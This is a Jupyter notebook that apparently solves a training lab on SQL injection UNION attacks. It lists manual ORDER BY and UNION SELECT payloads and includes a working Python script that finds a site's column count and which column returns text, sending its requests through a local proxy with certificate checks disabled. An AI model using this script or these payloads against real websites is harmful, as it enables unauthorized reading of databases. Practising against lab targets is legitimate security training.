{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lab: SQL injection UNION attack, finding a column containing text\n",
    "1)'+order+by+3--  check number of columns.\n",
    "2)'UNION+select+NULL,+'a',+NULL--   second column contains text->return 200 OK\n",
    "3)' union select NULL,'lOyXUu',NULL--  return string lOyXUu on page\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import sys\n",
    "import urllib3\n",
    "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
    "\n",
    "proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}\n",
    "\n",
    "def exploit_sqli_column_number(url):\n",
    "    path = \"filter?category=Gifts\"\n",
    "    for i in range(1,50):\n",
    "        sql_payload = \"'+order+by+%s--\" %i\n",
    "        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)\n",
    "        res = r.text\n",
    "        if \"Internal Server Error\" in res:\n",
    "            return i - 1\n",
    "        i = i + 1\n",
    "    return False\n",
    "\n",
    "def exploit_sqli_string_field(url, num_col):\n",
    "    path = \"filter?category=Gifts\"\n",
    "    for i in range(1, num_col+1):\n",
    "        string = \"'v2F6UA'\"\n",
    "        payload_list = ['null'] * num_col\n",
    "        payload_list[i-1] = string\n",
    "        sql_payload = \"' union select \" + ','.join(payload_list) + \"--\"\n",
    "        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)\n",
    "        res = r.text\n",
    "        if string.strip('\\'') in res:\n",
    "            return i\n",
    "    return False\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    try:\n",
    "        url = sys.argv[1].strip()\n",
    "    except IndexError:\n",
    "        print(\"[-] Usage: %s <url>\" % sys.argv[0])\n",
    "        print(\"[-] Example: %s www.example.com\" % sys.argv[0])\n",
    "        sys.exit(-1)\n",
    "\n",
    "    print(\"[+] Figuring out number of columns...\")\n",
    "    num_col = exploit_sqli_column_number(url)\n",
    "    if num_col:\n",
    "        print(\"[+] The number of columns is \" + str(num_col) + \".\" )\n",
    "        print(\"[+] Figuring out which column contains text...\")\n",
    "        string_column = exploit_sqli_string_field(url, num_col)\n",
    "        if string_column:\n",
    "            print(\"[+] The column that contains text is \" + str(string_column) + \".\")\n",
    "        else:\n",
    "            print(\"[-] We were not able to find a column that has a string data type.\")\n",
    "    else:\n",
    "        print(\"[-] The SQLi attack was not successful.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
